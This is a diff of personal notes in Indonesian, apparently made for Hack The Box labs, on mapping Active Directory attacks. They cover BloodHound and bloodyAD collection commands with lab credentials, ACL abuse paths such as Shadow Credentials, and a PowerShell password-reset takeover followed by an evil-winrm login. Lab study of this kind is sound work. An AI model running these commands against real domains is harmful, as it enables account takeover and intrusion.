@@ -4,8 +4,8 @@ Kapan mulai pake bloodhound?
 
 dahulukan credential plaintext untuk generate bloodhound
 
-# Mapping Serangan
-## Colect data
+# 1. MAPPING SERANGAN
+## A. Colect data
 dahulukan credential plaintext untuk generate bloodhound
 ```shell
 bloodhound-python -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -dc 'DC01.garfield.htb' -d 'garfield.htb' --dns-tcp -ns 10.129.244.207 --dns-timeout 10 --zip -c All
@@ -21,22 +21,29 @@ kalau tidak bisa juga, gunakan bloodyad
 bloodyad --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get bloodhound
 ```
 ![](Attachments/Pasted%20image%2020260622145414.png)
-## Mark "OWNED"
+## B. Mark "OWNED"
 semua akun yang dimiliki, termasuk:
 - user password
 - TGT
 - shell
 
-## Cek Outbound Object Control
+## C. Cek Outbound Object Control
 apa yang bisa Akun ini kontrol.
+https://sn0xs-organization.gitbook.io/sn0x-order.org/red-team-notes/ad-exploitation/information-gathering/bloodyad 
+### i. Generic Write
+[Attack - Shadow Credential](Attack%20-%20Shadow%20Credential.md)
+### iI. ForceChangePassword
+```powershell
+# Change password from windows shell
+$TargetUser = [ADSI]"LDAP://CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb"
+$TargetUser.psbase.Invoke("SetPassword", "YourNewPass123!")
 
-| ACL           | Attack                                                                                           |
-| ------------- | ------------------------------------------------------------------------------------------------ |
-| Write Owner   | can change the owner of a group or modify the access control list (ACL) Management for the group |
-| Generic All   | Full Control                                                                                     |
-| Generic Write | Shadow Credential Attack                                                                         |
+# test login from linux
+evil-winrm -i garfield.htb -u 'l.wilson_adm' -p 'YourNewPass123!'
+```
+![](Attachments/Pasted%20image%2020260805132538.png)
 
-# Error
+# 2. ERROR
 ## deadbeef
 problem -> ipv6 active
 ![](Attachments/Pasted%20image%2020260622134301.png)
